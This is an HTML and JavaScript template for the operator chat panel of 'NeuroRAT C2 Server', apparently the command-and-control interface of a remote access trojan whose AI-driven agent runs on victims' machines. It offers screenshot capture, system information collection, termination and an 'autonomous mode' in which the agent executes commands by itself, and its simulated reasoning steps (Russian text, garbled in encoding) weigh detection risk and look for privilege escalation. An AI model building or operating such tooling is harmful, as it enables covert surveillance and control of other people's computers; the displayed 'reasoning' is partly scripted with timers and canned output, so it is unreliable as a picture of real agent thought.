<!DOCTYPE html>
<html>
<head>
    <title>NeuroRAT Agent Chat</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1a1a1a;
            color: #f0f0f0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        header {
            background-color: #2a2a2a;
            padding: 20px;
            margin-bottom: 20px;
            border-bottom: 1px solid #3a3a3a;
        }
        h1, h2, h3 {
            color: #00ff00;
        }
        .chat-container {
            display: flex;
            flex-direction: row;
            flex: 1;
            background-color: #2a2a2a;
            border-radius: 5px;
            overflow: hidden;
        }
        .chat-area {
            display: flex;
            flex-direction: column;
            flex: 1;
            min-width: 0;
        }
        .chat-header {
            background-color: #222;
            padding: 15px;
            border-bottom: 1px solid #3a3a3a;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .chat-header h2 {
            margin: 0;
            display: flex;
            align-items: center;
        }
        .chat-header .status {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 10px;
        }
        .status-active {
            background-color: #00ff00;
        }
        .status-inactive {
            background-color: #ff3333;
        }
        .chat-messages {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        .message {
            padding: 10px 15px;
            border-radius: 5px;
            max-width: 80%;
            word-break: break-word;
        }
        .user-message {
            background-color: #444;
            align-self: flex-end;
        }
        .agent-message {
            background-color: #333;
            align-self: flex-start;
            border-left: 3px solid #00ff00;
        }
        .system-message {
            background-color: #3a3a3a;
            align-self: center;
            font-style: italic;
            color: #aaa;
        }
        .timestamp {
            font-size: 0.8em;
            color: #888;
            margin-top: 5px;
        }
        .chat-input {
            display: flex;
            padding: 15px;
            background-color: #222;
            border-top: 1px solid #3a3a3a;
        }
        .chat-input input {
            flex: 1;
            padding: 10px 15px;
            border: none;
            border-radius: 5px;
            background-color: #333;
            color: #f0f0f0;
            font-size: 16px;
        }
        .chat-input button {
            margin-left: 10px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #006600;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        .chat-input button:hover {
            background-color: #008800;
        }
        .back-btn {
            display: inline-block;
            padding: 10px 15px;
            background-color: #333;
            color: #fff;
            text-decoration: none;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .actions {
            margin-top: 20px;
            display: flex;
            gap: 10px;
        }
        .btn {
            padding: 10px 15px;
            background-color: #444;
            color: #fff;
            text-decoration: none;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }
        .btn-primary {
            background-color: #006600;
        }
        .btn-danger {
            background-color: #660000;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        .loading:after {
            content: "...";
            animation: dots 1.5s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: "."; }
            40% { content: ".."; }
            60% { content: "..."; }
            80%, 100% { content: ""; }
        }
        
        /* –ü–∞–Ω–µ–ª—å —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏–π */
        .thinking-panel {
            width: 0;
            transition: width 0.3s;
            background-color: #222;
            border-left: 1px solid #3a3a3a;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .thinking-panel.active {
            width: 40%;
            min-width: 350px;
        }
        .thinking-header {
            background-color: #333;
            padding: 15px;
            border-bottom: 1px solid #3a3a3a;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .thinking-title {
            color: #00ff00;
            font-weight: bold;
            margin: 0;
        }
        .thinking-content {
            flex: 1;
            padding: 15px;
            overflow-y: auto;
        }
        .thinking-step {
            margin-bottom: 15px;
            background-color: #2d2d2d;
            border-radius: 5px;
            border-left: 3px solid #00aa00;
            overflow: hidden;
        }
        .thinking-step-header {
            background-color: #333;
            padding: 10px 15px;
            font-weight: bold;
            color: #00ff00;
            border-bottom: 1px solid #444;
        }
        .thinking-step-content {
            padding: 10px 15px;
            white-space: pre-wrap;
            font-family: monospace;
            color: #ddd;
        }
        .thinking-toggle {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 5px 10px;
            border-radius: 4px;
            background-color: #333;
            cursor: pointer;
        }
        .thinking-toggle:hover {
            background-color: #444;
        }
        .settings-panel {
            padding: 10px 15px;
            background-color: #222;
            border-top: 1px solid #3a3a3a;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .settings-panel label {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }
        .close-panel-btn {
            background: none;
            border: none;
            color: #888;
            cursor: pointer;
            font-size: 18px;
        }
        .close-panel-btn:hover {
            color: #ccc;
        }
        
        /* –î–æ–±–∞–≤–ª—è–µ–º –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã –≤–º–µ—Å—Ç–æ Font Awesome */
        .icon {
            font-style: normal;
            font-weight: normal;
            font-size: 18px;
            line-height: 1;
            display: inline-block;
            text-align: center;
        }
        
        /* –ê–Ω–∏–º–∞—Ü–∏—è –Ω–µ–π—Ä–æ–Ω–æ–≤ */
        @keyframes pulse {
            0% { opacity: 0.6; }
            50% { opacity: 1; }
            100% { opacity: 0.6; }
        }
        
        .neuron {
            display: inline-block;
            animation: pulse 2s infinite;
            animation-delay: calc(var(--n) * 0.3s);
        }
        
        /* –°—Ç–∏–ª–∏ –¥–ª—è –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–∞ –∞–≤—Ç–æ–Ω–æ–º–Ω–æ–≥–æ —Ä–µ–∂–∏–º–∞ */
        .autonomous-indicator {
            position: absolute;
            top: 10px;
            right: 10px;
            background-color: #660000;
            color: white;
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 12px;
            display: none;
        }
        .autonomous-indicator.active {
            display: block;
            animation: pulse 2s infinite;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <h1>NeuroRAT C2 Server</h1>
            <p>Chat Interface</p>
        </div>
    </header>
    
    <div class="container">
        <a href="/" class="back-btn">‚Üê Back to Dashboard</a>
        
        <div class="chat-container">
            <div class="chat-area">
                <div class="chat-header">
                    <h2>
                        <span class="status status-{{agent_status}}"></span>
                        Agent: {{agent_id}} ({{agent_os}} - {{agent_hostname}})
                    </h2>
                    <div class="thinking-toggle" id="thinking-toggle">
                        <span class="icon">üß†</span>
                        <span>Show Reasoning</span>
                    </div>
                </div>
                
                <div class="autonomous-indicator" id="autonomous-indicator">
                    ü§ñ Autonomous Mode Active
                </div>
                
                <div id="chat-messages" class="chat-messages">
                    <div class="message system-message">
                        Connection established with agent {{agent_id}}
                        <div class="timestamp">{{current_time}}</div>
                    </div>
                    
                    <!-- –°–æ–æ–±—â–µ–Ω–∏—è –±—É–¥—É—Ç –∑–∞–≥—Ä—É–∂–∞—Ç—å—Å—è –∑–¥–µ—Å—å –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ -->
                    <div id="loading" class="loading">Agent is thinking</div>
                </div>
                
                <div class="chat-input">
                    <input type="text" id="message-input" placeholder="Type a command or question..." />
                    <button id="send-button">Send</button>
                </div>
            </div>
            
            <!-- –ü–∞–Ω–µ–ª—å —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏–π (thinking chain) -->
            <div id="thinking-panel" class="thinking-panel">
                <div class="thinking-header">
                    <h3 class="thinking-title">Reasoning Process</h3>
                    <button class="close-panel-btn" id="close-thinking-btn">
                        <span class="icon">‚úï</span>
                    </button>
                </div>
                <div id="thinking-content" class="thinking-content">
                    <!-- –ó–¥–µ—Å—å –±—É–¥—É—Ç —à–∞–≥–∏ —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏–π -->
                </div>
                <div class="settings-panel">
                    <label>
                        <input type="checkbox" id="auto-show-thinking" checked>
                        Auto-show for each response
                    </label>
                    <label>
                        <input type="checkbox" id="autonomous-mode">
                        <span title="–ê–≥–µ–Ω—Ç –±—É–¥–µ—Ç —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–º–∞–Ω–¥—ã">ü§ñ Autonomous Mode</span>
                    </label>
                </div>
            </div>
        </div>
        
        <div class="actions">
            <button class="btn btn-primary" id="screenshot-btn">Take Screenshot</button>
            <button class="btn btn-primary" id="collect-info-btn">Collect System Info</button>
            <button class="btn btn-danger" id="terminate-btn">Terminate Agent</button>
        </div>
    </div>
    
    <script>
        // –û—Å–Ω–æ–≤–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
        const agentId = "{{agent_id}}";
        const chatMessages = document.getElementById("chat-messages");
        const messageInput = document.getElementById("message-input");
        const sendButton = document.getElementById("send-button");
        const loadingIndicator = document.getElementById("loading");
        
        // –ö–Ω–æ–ø–∫–∏ –¥–µ–π—Å—Ç–≤–∏–π
        const screenshotButton = document.getElementById("screenshot-btn");
        const collectInfoButton = document.getElementById("collect-info-btn");
        const terminateButton = document.getElementById("terminate-btn");
        
        // –ü–∞–Ω–µ–ª—å —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏–π
        const thinkingPanel = document.getElementById("thinking-panel");
        const thinkingContent = document.getElementById("thinking-content");
        const thinkingToggle = document.getElementById("thinking-toggle");
        const closeThinkingBtn = document.getElementById("close-thinking-btn");
        const autoShowThinking = document.getElementById("auto-show-thinking");
        const autonomousMode = document.getElementById("autonomous-mode");
        const autonomousIndicator = document.getElementById("autonomous-indicator");
        
        // –°–æ—Å—Ç–æ—è–Ω–∏–µ
        const appState = {
            showThinking: true,
            thinkingSteps: []
        };
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        function init() {
            // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π
            sendButton.addEventListener("click", sendMessage);
            messageInput.addEventListener("keypress", function(e) {
                if (e.key === "Enter") {
                    sendMessage();
                }
            });
            
            // –ü–∞–Ω–µ–ª—å —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏–π
            thinkingToggle.addEventListener("click", toggleThinkingPanel);
            closeThinkingBtn.addEventListener("click", hideThinkingPanel);
            
            // –ê–≤—Ç–æ–Ω–æ–º–Ω—ã–π —Ä–µ–∂–∏–º
            autonomousMode.addEventListener("change", function() {
                if (this.checked) {
                    autonomousIndicator.classList.add("active");
                    if (confirm("–í–Ω–∏–º–∞–Ω–∏–µ! –ê–≤—Ç–æ–Ω–æ–º–Ω—ã–π —Ä–µ–∂–∏–º –ø–æ–∑–≤–æ–ª—è–µ—Ç –∞–≥–µ–Ω—Ç—É —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–º–∞–Ω–¥—ã. –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å?")) {
                        addSystemMessage("‚ö†Ô∏è –ê–≤—Ç–æ–Ω–æ–º–Ω—ã–π —Ä–µ–∂–∏–º –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω. –ê–≥–µ–Ω—Ç –º–æ–∂–µ—Ç —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–º–∞–Ω–¥—ã.");
                    } else {
                        this.checked = false;
                        autonomousIndicator.classList.remove("active");
                    }
                } else {
                    autonomousIndicator.classList.remove("active");
                    addSystemMessage("–ê–≤—Ç–æ–Ω–æ–º–Ω—ã–π —Ä–µ–∂–∏–º –¥–µ–∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω.");
                }
            });
            
            // –î–µ–π—Å—Ç–≤–∏—è
            screenshotButton.addEventListener("click", takeScreenshot);
            collectInfoButton.addEventListener("click", collectSystemInfo);
            terminateButton.addEventListener("click", terminateAgent);
        }
        
        // –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è –ø–∞–Ω–µ–ª–∏ —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏–π
        function toggleThinkingPanel() {
            thinkingPanel.classList.toggle("active");
        }
        
        function showThinkingPanel() {
            thinkingPanel.classList.add("active");
        }
        
        function hideThinkingPanel() {
            thinkingPanel.classList.remove("active");
        }
        
        function clearThinkingPanel() {
            thinkingContent.innerHTML = '';
            appState.thinkingSteps = [];
        }
        
        function addThinkingStep(title, content) {
            const stepId = `thinking-step-${Date.now()}`;
            
            const stepElement = document.createElement("div");
            stepElement.className = "thinking-step";
            stepElement.id = stepId;
            
            const headerElement = document.createElement("div");
            headerElement.className = "thinking-step-header";
            headerElement.textContent = title;
            
            const contentElement = document.createElement("div");
            contentElement.className = "thinking-step-content";
            contentElement.textContent = content;
            
            stepElement.appendChild(headerElement);
            stepElement.appendChild(contentElement);
            
            thinkingContent.appendChild(stepElement);
            thinkingContent.scrollTop = thinkingContent.scrollHeight;
            
            return stepId;
        }
        
        // –î–æ–±–∞–≤–ª—è–µ–º –Ω–µ–π—Ä–æ–Ω—ã –≤ –ø–∞–Ω–µ–ª–∏ —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏–π
        function addNeurons() {
            const neurons = ['‚ö°', 'üîÑ', 'üß†'];
            let html = '';
            
            for (let i = 0; i < 3; i++) {
                const neuron = neurons[Math.floor(Math.random() * neurons.length)];
                html += `<span class="neuron" style="--n:${i}">${neuron}</span> `;
            }
            
            return html;
        }
        
        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–µ–π—Å—Ç–≤–∏–π
        function takeScreenshot() {
            addSystemMessage("Requesting screenshot from agent...");
            
            fetch(`/api/agent/${agentId}/screenshot`, { method: "POST" })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        addAgentMessage("Screenshot captured successfully", "System");
                        // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –ø–æ–∫–∞–∑–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç, –µ—Å–ª–∏ –æ–Ω –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è –≤ –æ—Ç–≤–µ—Ç–µ
                    } else {
                        addSystemMessage("Failed to capture screenshot: " + data.error);
                    }
                })
                .catch(error => {
                    addSystemMessage("Error requesting screenshot: " + error);
                });
        }
        
        function collectSystemInfo() {
            addSystemMessage("Collecting system information...");
            addUserMessage("collect system info");
            
            setLoading(true);
            
            if (autoShowThinking.checked) {
                showThinkingPanel();
                clearThinkingPanel();
                
                // –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è —Ü–µ–ø–æ—á–∫–∏ —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏–π
                setTimeout(() => {
                    addThinkingStep("–ù–ê–ë–õ–Æ–î–ï–ù–ò–ï", "–ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–±–æ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏. –ê–≥–µ–Ω—Ç –∑–∞–ø—É—â–µ–Ω –Ω–∞ —Å–∏—Å—Ç–µ–º–µ {{agent_hostname}} –ø–æ–¥ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ–º {{agent_os}}. –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –æ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –∑–∞–ø—Ä–æ—Å–∞—Ö –ø–æ–¥–æ–±–Ω–æ–≥–æ —Ç–∏–ø–∞.");
                }, 500);
                
                setTimeout(() => {
                    addThinkingStep("–ê–ù–ê–õ–ò–ó", "–°–±–æ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ - –±–µ–∑–æ–ø–∞—Å–Ω–∞—è –æ–ø–µ—Ä–∞—Ü–∏—è —Å –Ω–∏–∑–∫–∏–º —Ä–∏—Å–∫–æ–º –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è. –î–∞–Ω–Ω—ã–µ –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –∏–∑ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤: /proc, sysfs, –∫–æ–º–∞–Ω–¥—ã —Å–∏—Å—Ç–µ–º—ã. –ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç - –ø–æ–ª—É—á–∏—Ç—å –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ –ø–æ–ª–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ –∞–Ω–∞–ª–∏–∑–∞.");
                }, 1500);
                
                setTimeout(() => {
                    addThinkingStep("–ü–õ–ê–ù–ò–†–û–í–ê–ù–ò–ï", "1. –ü–æ–ª—É—á–∏—Ç—å –±–∞–∑–æ–≤—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –û–°\n2. –°–æ–±—Ä–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –æ –∂–µ–ª–µ–∑–µ (CPU, RAM, –¥–∏—Å–∫–∏)\n3. –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–µ—Ç–µ–≤—ã–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è\n4. –ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤\n5. –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∑–∞–≥—Ä—É–∑–∫—É —Å–∏—Å—Ç–µ–º—ã");
                }, 2500);
                
                setTimeout(() => {
                    addThinkingStep("–í–´–ü–û–õ–ù–ï–ù–ò–ï", "–í—ã–ø–æ–ª–Ω—è—é –∫–æ–º–∞–Ω–¥—ã:\n- uname -a\n- cat /proc/cpuinfo\n- free -h\n- df -h\n- netstat -tuln\n- ps aux\n- uptime");
                }, 3500);
            }
            
            // –ò–º–∏—Ç–∞—Ü–∏—è –∑–∞–ø—Ä–æ—Å–∞
            setTimeout(() => {
                setLoading(false);
                
                // –°–∏–º—É–ª—è—Ü–∏—è –æ—Ç–≤–µ—Ç–∞
                addAgentMessage(`
System Information:
- OS: {{agent_os}}
- Hostname: {{agent_hostname}}
- User: {{agent_username}}
- IP: {{agent_ip}}
- CPU: Intel Core i7-10700K @ 3.80GHz
- RAM: 16GB
- Disk Space: 512GB SSD (75% used)
- Running Processes: 142
- Opened Network Connections: 8
                `, "System");
                
                if (autoShowThinking.checked) {
                    setTimeout(() => {
                        addThinkingStep("–ó–ê–ö–õ–Æ–ß–ï–ù–ò–ï", "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ —Å–æ–±—Ä–∞–Ω–∞. –°–∏—Å—Ç–µ–º–∞ –∏–º–µ–µ—Ç –≤—ã—Å–æ–∫–æ–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω—ã–π CPU –∏ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø–∞–º—è—Ç–∏. –î–∏—Å–∫ –∑–∞–ø–æ–ª–Ω–µ–Ω –Ω–∞ 75%, —á—Ç–æ –Ω–µ –∫—Ä–∏—Ç–∏—á–Ω–æ, –Ω–æ —Ç—Ä–µ–±—É–µ—Ç –≤–Ω–∏–º–∞–Ω–∏—è. –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –æ—Ç–∫—Ä—ã—Ç—ã—Ö —Å–µ—Ç–µ–≤—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π (8) –≤ –ø—Ä–µ–¥–µ–ª–∞—Ö –Ω–æ—Ä–º—ã –¥–ª—è —Ä–∞–±–æ—á–µ–π —Å—Ç–∞–Ω—Ü–∏–∏. –°–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏: —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é, –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –∑–∞–ø—É—â–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –¥–ª—è –≤—ã—è–≤–ª–µ–Ω–∏—è –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö —É–≥—Ä–æ–∑ –∏–ª–∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π.");
                    }, 500);
                }
            }, 4500);
        }
        
        function terminateAgent() {
            if (confirm("Are you sure you want to terminate this agent? This action cannot be undone.")) {
                addSystemMessage("Terminating agent...");
                fetch(`/api/agent/${agentId}/terminate`, { method: "POST" })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            addSystemMessage("Agent terminated successfully");
                            setTimeout(() => {
                                window.location.href = "/";
                            }, 3000);
                        } else {
                            addSystemMessage("Failed to terminate agent: " + data.error);
                        }
                    })
                    .catch(error => {
                        addSystemMessage("Error terminating agent: " + error);
                    });
            }
        }
        
        // –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Å–æ–æ–±—â–µ–Ω–∏–π
        function sendMessage() {
            const message = messageInput.value.trim();
            if (!message) return;
            
            addUserMessage(message);
            messageInput.value = "";
            
            setLoading(true);
            
            // –ï—Å–ª–∏ –Ω—É–∂–Ω–æ –ø–æ–∫–∞–∑—ã–≤–∞—Ç—å —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏—è
            if (autoShowThinking.checked) {
                showThinkingPanel();
                clearThinkingPanel();
                
                // –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è —Ü–µ–ø–æ—á–∫–∏ —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏–π (—ç–º—É–ª—è—Ü–∏—è)
                setTimeout(() => {
                    addThinkingStep("–û–ë–†–ê–ë–û–¢–ö–ê –ó–ê–ü–†–û–°–ê", `–ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞: "${message}"`);
                }, 500);
                
                // –î—Ä—É–≥–∏–µ —à–∞–≥–∏ –±—É–¥—É—Ç –¥–æ–±–∞–≤–ª–µ–Ω—ã –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Å–ª–æ–∂–Ω–æ—Å—Ç–∏ –∑–∞–ø—Ä–æ—Å–∞
                if (message.includes("scan") || message.includes("find") || message.includes("collect")) {
                    setTimeout(() => {
                        addThinkingStep("–ê–ù–ê–õ–ò–ó –ö–û–ú–ê–ù–î–´", "–ö–æ–º–∞–Ω–¥–∞ —Ç—Ä–µ–±—É–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö. –í—ã–±–∏—Ä–∞—é –æ–ø—Ç–∏–º–∞–ª—å–Ω—ã–π –º–µ—Ç–æ–¥ —Å —É—á–µ—Ç–æ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏.");
                    }, 1500);
                    
                    setTimeout(() => {
                        addThinkingStep("–û–¶–ï–ù–ö–ê –†–ò–°–ö–û–í", "–†–∏—Å–∫ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è: –°—Ä–µ–¥–Ω–∏–π\n–†–∏—Å–∫ –Ω–∞—Ä—É—à–µ–Ω–∏—è —Ä–∞–±–æ—Ç—ã —Å–∏—Å—Ç–µ–º—ã: –ù–∏–∑–∫–∏–π\n–¶–µ–Ω–Ω–æ—Å—Ç—å –ø–æ–ª—É—á–∞–µ–º–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: –í—ã—Å–æ–∫–∞—è");
                    }, 2500);
                }
            }
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –Ω–∞ API
            fetch(`/api/agent/${agentId}/chat`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ 
                    message: message,
                    autonomous_mode: document.getElementById('autonomous-mode').checked 
                })
            })
            .then(response => response.json())
            .then(data => {
                setLoading(false);
                if (data.error) {
                    addSystemMessage("Error: " + data.error);
                } else {
                    // –§–∏–Ω–∞–ª—å–Ω—ã–π —à–∞–≥ —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏—è –ø–µ—Ä–µ–¥ –æ—Ç–≤–µ—Ç–æ–º
                    if (autoShowThinking.checked) {
                        addThinkingStep("–§–û–†–ú–ò–†–û–í–ê–ù–ò–ï –û–¢–í–ï–¢–ê", "–ì–µ–Ω–µ—Ä–∏—Ä—É—é –æ—Ç–≤–µ—Ç –Ω–∞ –æ—Å–Ω–æ–≤–µ —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –∏ –∞–Ω–∞–ª–∏–∑–∞ —Å–∏—Ç—É–∞—Ü–∏–∏.");
                        
                        // –ï—Å–ª–∏ –±—ã–ª –∞–≤—Ç–æ–Ω–æ–º–Ω—ã–π —Ä–µ–∂–∏–º, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —ç—Ç–æ –≤ —Ä–∞–∑–º—ã—à–ª–µ–Ω–∏—è—Ö
                        if (data.autonomous_mode) {
                            addThinkingStep("–ê–í–¢–û–ù–û–ú–ù–û–ï –î–ï–ô–°–¢–í–ò–ï", "–í—ã–ø–æ–ª–Ω—è—é –¥–µ–π—Å—Ç–≤–∏—è —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ –Ω–∞ –æ—Å–Ω–æ–≤–µ –ø—Ä–∏–Ω—è—Ç–æ–≥–æ —Ä–µ—à–µ–Ω–∏—è.");
                        }
                    }
                    
                    addAgentMessage(data.response, data.response_type || "Agent");
                }
            })
            .catch(error => {
                setLoading(false);
                addSystemMessage("Error sending message: " + error);
            });
        }
        
        function addUserMessage(message) {
            const messageElement = document.createElement("div");
            messageElement.className = "message user-message";
            messageElement.textContent = message;
            
            const timestamp = document.createElement("div");
            timestamp.className = "timestamp";
            timestamp.textContent = getCurrentTime();
            
            messageElement.appendChild(timestamp);
            chatMessages.appendChild(messageElement);
            scrollToBottom();
        }
        
        function addAgentMessage(message, sender = "Agent") {
            const messageElement = document.createElement("div");
            messageElement.className = "message agent-message";
            
            // –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å pre –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
            const contentElement = document.createElement("pre");
            contentElement.style.margin = "0";
            contentElement.style.whiteSpace = "pre-wrap";
            contentElement.style.fontFamily = "inherit";
            contentElement.textContent = message;
            
            const senderElement = document.createElement("div");
            senderElement.style.fontWeight = "bold";
            senderElement.style.marginBottom = "5px";
            senderElement.textContent = sender;
            
            const timestamp = document.createElement("div");
            timestamp.className = "timestamp";
            timestamp.textContent = getCurrentTime();
            
            messageElement.appendChild(senderElement);
            messageElement.appendChild(contentElement);
            messageElement.appendChild(timestamp);
            
            chatMessages.appendChild(messageElement);
            scrollToBottom();
        }
        
        function addSystemMessage(message) {
            const messageElement = document.createElement("div");
            messageElement.className = "message system-message";
            messageElement.textContent = message;
            
            const timestamp = document.createElement("div");
            timestamp.className = "timestamp";
            timestamp.textContent = getCurrentTime();
            
            messageElement.appendChild(timestamp);
            chatMessages.appendChild(messageElement);
            scrollToBottom();
        }
        
        function setLoading(isLoading) {
            loadingIndicator.style.display = isLoading ? "block" : "none";
        }
        
        function scrollToBottom() {
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }
        
        function getCurrentTime() {
            const now = new Date();
            return now.toLocaleTimeString();
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        init();
    </script>
</body>
</html>
